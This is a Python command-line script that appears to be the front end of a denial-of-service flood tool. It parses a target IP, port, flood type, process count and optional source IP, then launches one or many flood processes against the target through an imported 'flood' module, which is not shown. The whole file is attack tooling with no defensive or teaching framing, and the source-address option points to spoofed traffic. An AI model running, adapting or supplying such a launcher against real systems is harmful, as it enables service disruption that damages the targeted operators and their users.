from context import flood
from argparse import ArgumentParser
from sys import exit

parser = ArgumentParser()
parser.add_argument('ip', help='Target IP address', type=str)
parser.add_argument('port', help='Target Port', type=str)
parser.add_argument('type', help='Flood type', type=int)
parser.add_argument('--procs', help='Number of processes', type=int)
parser.add_argument('--source', help='Source IP address', type=str)
parser.add_argument('--list', help='List of flood types', action='store_true')
args = parser.parse_args()
jobs = []

if __name__ == '__main__':
	if args.list:
		ft = flood.Flood
		for floodType in ft.get_list():
			print(str(floodType.get_type_id()), ': ' + floodType.get_name())
		exit()
	elif args.ip and args.port and args.type and args.procs:
		print('Starting flood on %s processes...' % args.procs)
		for i in range(0, args.procs):
			job = flood.Flood(args.ip, args.port, args.type)
			jobs.append(job)
			job.start()
		for j in jobs:
			j.join()
	elif args.ip and args.port and args.type:
		print('Starting flood...')
		flood.Flood(args.ip, args.port, args.type).run()
	else:
		parser.print_help()
		exit()
